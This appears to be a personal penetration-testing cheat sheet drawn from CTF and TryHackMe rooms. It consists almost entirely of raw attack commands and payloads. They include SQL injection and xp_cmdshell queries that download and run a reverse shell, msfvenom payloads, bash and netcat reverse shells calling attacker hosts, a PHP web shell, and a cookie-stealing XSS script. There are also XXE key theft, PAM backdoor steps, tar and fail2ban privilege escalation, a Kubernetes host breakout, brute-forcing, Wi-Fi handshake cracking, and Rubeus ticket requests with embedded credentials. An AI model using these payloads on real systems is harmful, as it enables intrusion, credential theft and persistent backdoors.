SELECT id FROM books WHERE title like '' UNION SELECT '3' -- - %'
Query 2:
SELECT * FROM books WHERE id = '3'
------------------------------------------------------------------------



steghide embed -cf regular_image.jpeg -ef super_secret_stuff.txt

steghide — The name of the programembed — This is the command-cf — This flag is for the cover file (file used to embed data)filename — This is the name of the cover file-ef — This flag is for the embed file (file that will be embedded)filename — This is the name of the embedded file


steghide extract -sf regular_image.jpeg



docker run -v /:/mnt --rm -it alpine chroot /mnt sh

docker go to market


find / -group adm 


hydra http-get 

sudo hydra -L wl -P /usr/share/wordlists/rockyou.txt  10.10.34.30 http-get  /inferno -t 64


python2 exploit.py http://admin:dante1@10.10.34.30/inferno/ 'admin' 'dante1' 10.9.116.83  9001 linux

mysql -u runcheck -pCTF_script_cave_changeme -h 10.10.13.11
show DATABASES;
use runornot
show tables
use runcheck
SELECT * FROM runcheck ;
'''''
update runcheck
    -> set 
    -> run=1 ;
''''


wget -r  --no-parent http:// .... # get dir 


# python echo strings escaping 

\.';;'


VIEWING pam version 


rpm -qa | grep pam
ldd /bin/su

pam.so backdoor 

#check the pam version
rpm -qa | grep pam 

#download the lib
http://www.linux-pam.org/library/<version>

#modify the pam_unix_auth.c at 
modules/pam_unix/

#compile 
make 

#cp pam_unix.so to 
/lib/x86_64-linux-gnu/security


hydra -l doak -P /usr/share/wordlists/rockyou.txt 10.10.115.76 -s 55007 pop3 

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null 



<?php echo shell_exec($_GET['cmd']);?>

subdomain bruteforce

wfuzz -c --hw 977 -u http://wekor.thm -H "Host: FUZZ.wekor.thm" -w /home/dwight/ctf_wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt


sqlmap http://[IP]/admin?user=3 --cookie='token=[Enter Cookie] --technique=U --delay=2 -dump




    MS-SQL: user_name()
    MySQL: user ()
    ORACLE: select user from dual;



port 11211 memcache dumping 

/tmp$ /usr/share/memcached/scripts/memcached-tool localhost:11211 dump

			or 

telnet localhost 11211


stats items (shows everything in the cache)
stats cachedump 1 0 (dump everything in the slab id(1))
get user (user query information in the cache)
get password (password query information in the cache)
press Ctrl+] to bring up the telnet prompt
type close to exit from telnet


mosquitto_sub -h 10.10.132.138 -t "#" -p 1883 This listens to all published models except "$SYS"
mosquitto_sub -h 10.10.132.138 -t "$SYS/#" -p 1883 This listens to "$SYS" published models



#getting absolute path 


/fileserver/test/%20/%20 

test

# PUT

500
/opt/apache-activemq-5.9.0/webapps/fileserver/test/ / (No such file or directory)

# and then MOVE

500
file:///opt/apache-activemq-5.9.0/webapps/admin/1.jsp / (No such file or directory)



using PUT and MOVE 

warning : use browser inspection tab

#curl the shell 

GET /admin/1.jsp?cmd=curl+10.9.116.83%3a8000/shell.sh+-o+sh




sudo nmap -sS -Pn -T4 -p-  10.10.133.123

#dynamic port forwarding 

sudo ssh -i id_rsa -N -D 1337  errorcauser@10.10.133.123

proxychains nmap -sT 127.0.0.1

ssh -i id_rsa -L 8080:127.0.0.1:80 errorcauser@10.10.133.123




after updateing metasploit 

sudo gem install bundler -v 2.2.4

sudo msfdb reinit
sudo msfconsolef

url encoder ../../../../..//etc/passwd
%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fpasswd

# breaking python jail

__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')

%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd



webpage http-get credential store dir 

/etc/apache2/.htpasswd


tar and backups

echo "" > --checkpoint=1 
echo "" > '--checkpoint-action=exec=sh shell.sh'
touch shell.sh
--- --------------
#!/bin/bash

chmod +s /bin/bash
-----------------
suid 

/bin/bash -p 


gobuster subdomain 

gobuster vhost -w  ~/ctf_wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u http://vulnnet.thm


msfvenom .war payload

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.116.83 LPORT=1234 -f war -o reverse.war

curl upload 

curl -u webdev --upload-file revshell2.war http://10.10.102.26:8080/manager/text/deploy?path=/

viewing apache tomcat deployed application

10.10.230.186:8080/manager/text/list

/manager/html

port 8009 open tomcat and apache wire vul ghostcat 

exploit/multi/handler 
gunzip for .gz
ajpshooter for ghostcat 00theway lfi /WEB-INF/web.xml read

exploit found at sudo -l 
(root) /usr/bin/java -jar *.jar 

java exploit 
msfvenom java -p java/meterpreter/reverse_tcp LHOST=10.9.116.83 LPORT=9001 -f jar -o rev.jar 
handle with meterpreter 
PAYLOAD /java/meterpreter/reverse_tcp 



xml external entity attack --- xml server side parser vulnerability xxa attack 

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data  [
<!ENTITY file SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<comment>
  <name>Joe Hamd</name>
  <author>&file;</author>
</comment>




<?php

	$cookie = $_GET[" c"];
	$file = fopen('cookielog.txt', 'a');
	fwrite($file, $cookie . "\n\n");
	/* 
	inject 
	<script language="javascript"> document.location= " http://kennethzhang.net/cookiegrab.php?c=" + document.cookie; </script>
	into vulnerable text fields
	*/
?> 


dns request catcher used 10.10.10.100 

</textarea><script>
var email = document.getElementById('email').innerHTML; 
var my_address = "a5087b991f03cd88a276a069882653d9.log.tryhackme.tech";
var request = new XMLHttpRequest();
request.open ("GET", "http://" + email + my_address , false ); 
request.send();
</script>



curl -v 'http://10.10.93.102:808/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-type: text/plain;echo;cat /etc/passwd;' -H 'Content-type: text/plain' 

curl -v 'http://10.10.93.102:8082/cgi-bin/.%%32%62/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'

enca -L none file 

https://onlinestringtools.com/convert-string-to-ascii


sqsh -S 10.10.110.134 -U sa -P "t7uLKzddQzVjVFJp" 
1>select * from reindeer.dbo.names; 
2> go #to excecute 
3> xp_cmdshell '<command>' 
4> xp_cmdshell 'type C:\Users\grinch\Documents\flag.txt'; 
5> xp_cmdshell 'dir C:\Users\grinch\Documents\'; 


ThinVNC Directory Travesal exploit Git
https://github.com/MuirlandOracle/CVE-2019-17662/blob/main/CVE-2019-17662.py

printspooler exploit printnightmare

 Windows PrintSpooler and dumping password hashes with Mimikatz.
 windows printer vul
 Invoke-Nightmare
 CVE-2021-1675
 printNightmare  


 aoc window privi
 net users
 systeminfo | findstr /B /C: "OS Name"/C: "OS Version"
 wmic service list

window rev shell using iperius backup service vuln
service path must defined using .bat file 
@echo off   C:\Users\McSkidy\Downloads\nc.exe ATTACK_IP 1337 -e cmd.exe


aws s3 ls s3://images.bestfestivalcompany.com  . --no-sign-request

aws s3 cp s3://images.bestfestivalcompany.com/0vF39p3.png  . --no-sign-request

curl http://images.bestfestivalcompany.com.s3.amazonaws.com/wp-backup.zip -o wp-backup.zip

aws s3 ls --profile PROFILENAME

ProTip: Never store a set of access keys in the [default] profile. Doing so forces you always to specify a profile and never accidentally run a command against an account you don't intend to. 

A few other common AWS reconnaissance techniques are:

    Finding the Account ID belonging to an access key:

    aws sts get-access-key-info --access-key-id AKIAEXAMPLE 

    Determining the Username the access key you're using belongs to

    aws sts get-caller-identity --profile PROFILENAME

    Listing all the EC2 instances running in an account

    aws ec2 describe-instances --output text --profile PROFILENAME
    Listing all the EC2 instances running in an account in a different region
    aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME


aws secretsmanager list-secrets

aws secretsmanager get-secret-value --secret-id HR-Password
arn:aws:secretsmanager:us-east-1:019181489476:secret:HR-Password-8AkWYF 2021-11-23T20:29:07.718000-05:00        HR-Password     The Secret you're looking for is not in this **REGION**. Santa wants to have low latency to his databases. Look closer to where he lives.       70630b3c-4fbe-4a24-885d-18445bd808b1


aws secretsmanager get-secret-value --secret-id HR-Password


aws secretsmanager --region eu-north-1  get-secret-value --secret-id HR-Password





arn:aws:secretsmanager:eu-north-1:019181489476:secret:HR-Password-KIJEvK        2021-11-13T08:26:19.996000-05:00        HR-Password     Winter2021!     f806c3cd-ea20-4a1a-948f-80927f3ad366
VERSIONSTAGES   AWSCURRENT



Docker installation 
sudo apt install apt-transport-https ca-certificates curl software-properties-common
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu `lsb_release -cs` test"
sudo apt update
sudo apt install docker-ce
sudo apt  install docker.io


$key = (New-Object System.Text.ASCIIEncoding).GetBytes("j3pn50vkw21hhurbqmxjlpmo9doiukyb")

$encrypted = "76492d1116743f0423413b16050a5345MgB8AEcAVwB1AFMATwB1ADgALwA0AGQAKwBSAEYAYQBHAE8ANgBHAG0AcQBnAHcAPQA9AHwAMwBlADAAYwBmADAAYQAzAGEANgBmADkAZQA0ADUAMABiADkANgA4ADcAZgA3ADAAMQA3ADAAOABiADkAZAA2ADgAOQA2ADAANQA3AGEAZAA4AGMANQBjADIAMAA4ADYAYQA0ADMAMABkADkAMwBiADUAYQBhADIANwA5AGMAYQA1ADYAYQAzAGEAYQA2ADUAMABjADAAMwAzADYANABlADYAOAA4ADQAYwAxAGMAYwAxADkANwBiADIANAAzADMAMAAzADgAYQA5ADYANAAzADEANAA2AGUAZgBkAGEAMAA3ADcANQAyADcAZgBlADMAZQA3ADUANwAyADkAZAAwAGUAOQA5ADQAOQA1AGQAYQBkADEANQAxADYANwA2AGIAYQBjADAAMQA0AGEAOQA3ADYAYgBkAGMAOAAxAGMAZgA2ADYAOABjADEAMABmADcAZgAyADcAZgBjADEAYgA3AGYAOAA3AGIANQAyAGUAMwA4ADgAYQAxADkANgA4ADMA"

echo $encrypted | ConvertTo-SecureString -key $key | ForEach-Object {[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($_))}


php webdelivery 
metasploit

mulit/script/web_delivery
http://10.10.220.93/index.php?path=/;php%20-d%20allow_url_fopen=true%20-r%20%22eval(file_get_contents(%27http://10.9.116.83:8080/qj4KuuHemXj%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22


usermod -aG sudo adam
adduser adam


SSH SOCKS PROXY, setup 
intention of using proxychains to conduct
my nMAP scans.

ssh -D localhost:9050 -f -N adam@10.10.220.93
proxychains nmap -A 172.16.20.6

sudo ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.6
sudo ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.3
172.16.20.0/24
sudo ssh -i id_rsa mike@172.16.20.6

service --status-all
wget http://10.9.116.83/linpeas.sh

sudo netstat -tulpn | grep LISTEN

file transfer 

curl -T zeno-monitoring.service http://10.9.116.83:8000/home/dwight/tryhackme/zeno/
nc -lvnp 8000 | tee zeno-monitoring.service


smb login
crackmapexec smb 10.10.182.191  -u user -p password 

smb share login with impacket psexec.py

confirm login by 

psexec.py bob:'!P@$$W0rD!123'@relevant

psexec.py USERNAME:PASSWORD@10.10.182.191


SMB share, we can craft a reverse shell payload to connect to the machine. Knowing that IIS generally requires an aspx shell, we craft one with msfvenom. 

window server 2016 so x64

iss use file with .aspx extension so craft the payload with .aspx extension

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.116.83 LPORT=1234 -f aspx -o payload.aspx


for windows reverse shell spawing 

use : curl to trigger the page 
and catch rev shell with nc

whoami /priv (window) == sudo -l (linux)

SeImpersonatePrivilege        Impersonate a client after authentication Enabled (means potato attack enable)
but DCOM is enable to prevent potato attack

since we are service account which is iis apppool\defaultapppool (iss service account)

we can use other service account laterally

using PrintSpoofer.exe to elavate privilege with SeImpersonate privilege

PrintSpoofer -i -c cmd

gain root

C:/inetpub/wwwroot/...1995

 /[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/|  bypass echo 



perl 
 libimage-exiftool-perl

 git clone http://team.thm:31111/leeroy/jenkins.git
touch test
git add test
git ci -m "test"
git push origin master


msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.9.116.83 LPORT=4444 -f elf > shell

kubernetes service account token finding

cat /var/run/secrets/kubernetes.io/serviceaccount/token

listing all avaiable namespaces to enumerate secret

kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  get namespaces

default
kube-system


kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 auth can-i --list

RBAC is not enabled in clustered -- no result 

kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 -n kube-system get secret flag3 -o json | jq -r '.data | map_values(@base64d)'


Privilage escalation via pod breakout 
Using service token to creat new pod in cluster

PE via pod


finding avaiable pod to reference and breakout

kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  get pods
----------------------------------------------------------------------------------

PE via Docker Image

finding docker available docker images in kubernet node

kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 get node -o yaml


using ngix docker image and creating yaml file 

ngix docker image : docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750)



yaml format 
//
apiVersion: v1
kind: Pod
metadata:
  name: host
spec:
  containers:
  - image: docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750
    name: host
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory

      //
using host.yaml yaml to creat pod/host on target 
kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 -n default apply -f host.yaml

accessing newly created pod
kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 -n default exec -it host bash


------------------

kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  get namespaces 
kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  get pods
kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  get nodes
kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  get secret
kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  -n kube-system get secret
kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443  -n kube-system get secret flag3 -o json

------------------
hello
sudo apt-get update && sudo apt-get upgrade

capabilites

/usr/bin/python3.7 = cap_setuid+ep

getcap -r / 2>/dev/null


openport 5985,5986 - Pentesting OMI

wrms vul omigod.py

generating fourdigit using bashscript
for i in {0000..9999}; do echo "$i"; done > pins.txt

ssl password generate
openssl passwd -6 -salt xyz pwned

fail2ban exploit PE vector



edit the configuration file
nano /etc/fail2ban/action.d/iptables-multiport.conf

------------------------
#
#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
actionban = chmod 777 /etc/shadow

# Option:  actionunban

---------------------------------

restart service 
sudo /bin/systemctl restart fail2ban

using hydra to bruteforce ssh to triger fail2ban action 
hydra -l fail2exploit -P /usr/share/wordlists/rockyou.txt ssh://10.10.21.12 

exploit works 

hyrda for vnc

hydra -s 5900  -P /usr/share/wordlists/rockyou.txt -t 16 10.10.12.202 vnc

install remmina 

sudo apt-get update
sudo apt-get -y install remmina

checking open port 
sudo ss  -------connected 
sudo ss -tulpn  -----------listening

mosquitto_sub -h 10.10.240.46 -t device/init 

mosquitto_pub -h 10.10.240.46 -t device/CNZ1CN7TCPKY9LMEHSDY/cmd -m  "{"CMD":10,"URL":"RTSP://10.9.25.139:8554/home/dwight/Desktop/aoc2022/day21"}"

docker run --rm -it --network=host aler9/rtsp-simple-server

generating hmac with key by using openssl from shell | key = "3RfDFz82"

cat order.txt | openssl dgst -sha256 -hmac ""

#setting up virtual env 

virtualenv --system-site-packages -p python ./venv
or
virtualenv some_dir

source some_dir/bin/activate

#force delete #remove directory
rm -rf (dir) 

pip list
pip install (package)

pip freeze --local > requirements.txt

deactivate

virtualenv -p /usr/bin/python2.7 (dir) #creating new env with specific python version

pip install -r requirements.txt

crunch 3 3 0123456789ABCDEF -o 3digits.txt

hydra -l '' -P 3digits.txt -f -v 10.10.146.22 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000

 cewl -d 2 -m 5 -w passwords.txt http://10.10.135.83 --with-numbers

 cewl -d 0 -m 5 -w usernames.txt http://10.10.135.83/team.php --lowercase

 wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.135.83/login.php -d "username=FUZZ&password=FUZ2Z"


 cut -d ' ' -f3 access.log | cut -d ':' -f1 | sort | uniq -c | sort -r | head -n 10

 grep "frostlings.bigbadstash.thm" access.log | cut -d '=' -f2 | cut -d ' ' -f1 | head -n 5

grep "frostlings.bigbadstash.thm" access.log | cut -d '=' -f2 | cut -d ' ' -f1 | base64 -d

cut -d ' ' -f2 access.log | sort | uniq -c | wc -l


' union select @@version -- #sql version check query
----------------------------------------------------
http://10.10.169.200/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.25.139 LPORT=4444 -f exe -o reverse.exe

It's time to use our stacked query to call xp_cmdshell and execute the certutil.exe command on the target to download our payload.

http://10.10.169.200/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --

http://10.10.169.200/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://10.9.25.139:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --

http://10.10.169.200/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --

----------------------------------------------------
#abusing ad  #tgt #domainabuse #powerview #powershell #keberos tgt generation

Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights

.\Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"4yQwePZ0pZeNZmNA" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show

evil-winrm -i 10.10.57.198 -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3

----------------------------------------------------
#tar_extraction 

tar -xvzf filename.tar.gz

sudo -l

sudo deluser tracy sudo

sudo -l -U tracy  # checking if tracy in sudo group

/etc/ssh/sshd_config

PasswordAuthentication no

#Include /etc/ssh/sshd_config.d/*.conf

sudo systemctl restart ssh

cd /var/lib/jenkins/

config.xml and config.xml.bak.

Remove the "!--" and "--" for both authorizationStrategy and securityRealm, 

cp config.xml.bak config.xml

sudo systemctl restart jenkins

egrep '^PasswordAuthentication|^#Include' /etc/ssh/sshd_config

egrep 'denyAnonymousReadAccess|disableSignup|enableCaptcha' -C1 /var/lib/jenkins/config.xml

----------------------------------------------------

ftp server starting 

pip3 install pyftpdlib

python3 -m pyftpdlib

cat ip.text| grep "64 bytes" | cut -d " " -f 4 | tr -d ":"

for ip in $(cat iplist.txt);do sudo nmap -sS -p 80 -T4 $ip & done 

/usr/bin/bash -c  'bash -i >& /dev/tcp/10.17.33.96/9999 0>&1'

// wifi hack //

iw dev
sudo iw dev wlan2 scan 

sudo ip link set dev wlan2 down
sudo iw dev wlan2 set type monitor 
sudo ip link set dev wlan2 up 

sudo iw dev wlan2 info

sudo airodump-ng wlan2

// airodump capture 4way handshake
sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2

// deauthentication packet send
sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2

// cracking captured handshake using aircrack-ng in order to get psk
sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap

//extra wifi config
wpa_passphrase MalwareM_AP 'ENTER PSK HERE' > config
sudo wpa_supplicant -B -c config -i wlan2

proper shell 

python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo;fg
export TER=xMterm
export TERM=xterm-256color



